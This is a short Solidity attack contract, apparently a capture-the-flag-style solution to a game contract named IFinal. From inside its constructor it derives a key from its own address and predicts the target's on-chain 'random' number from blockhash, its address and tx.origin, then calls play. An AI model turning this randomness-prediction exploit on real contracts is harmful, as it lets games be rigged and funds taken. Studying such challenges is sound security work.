interface IFinal {
    function play(bytes8 key, uint256 guess) external returns (bool);
}

contract Attack {
    address public targetAddress;

    constructor(address _target) {
        targetAddress = _target;
        bytes8 k = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        
        bytes32 e1 = blockhash(block.number);
        bytes32 e2 = keccak256(abi.encodePacked(address(this)));
        bytes32 e3 = keccak256(abi.encodePacked(tx.origin));
        uint256 g = uint256(e1 ^ e2 ^ e3);
        IFinal(targetAddress).play(k, g);
    }
}

